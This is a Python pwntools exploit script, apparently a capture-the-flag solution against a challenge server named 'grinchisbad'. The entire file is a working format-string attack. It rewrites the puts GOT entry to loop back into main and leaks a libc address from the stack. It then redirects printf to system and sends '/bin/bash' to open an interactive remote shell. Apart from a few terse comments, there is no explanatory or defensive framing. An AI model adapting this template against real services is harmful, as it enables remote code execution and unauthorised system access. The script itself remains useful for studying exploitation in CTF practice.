from pwn import *
import sys, os

context.binary = elf = ELF("./grinchisbad_server", checksec=False)
libc = ELF("./libc", checksec=False)

REMOTE = len(sys.argv) > 1 and "remote" in sys.argv[1].lower()
OFFSET = 18

if REMOTE: r = remote("grinchisbad.norwayeast.azurecontainer.io", 2424)
else:      r = process(elf.path, aslr=True); print(r.pid); pause()

# Overwrite puts@got with main, so we get infinite format string exploits
payload = fmtstr_payload(OFFSET, {elf.got.puts: elf.sym.main}, write_size="int")
assert len(payload) <= 256
r.sendline(payload)

# Leak libc address from the stack and calculate libc base
r.sendline(b"%27$p")
for _ in range(2):
    r.recvuntil(b"Maybe so, I don't know, ")

LEAK = int(r.recvline().strip(),16)
libc.address = LEAK - 0x558a9

# Overwrite printf with system, so when the program prints our input, it executes it instead
payload = fmtstr_payload(OFFSET, {elf.sym["got.printf"]:libc.sym["system"]})
r.sendline(payload)
r.sendline(b"/bin/bash")

r.interactive()
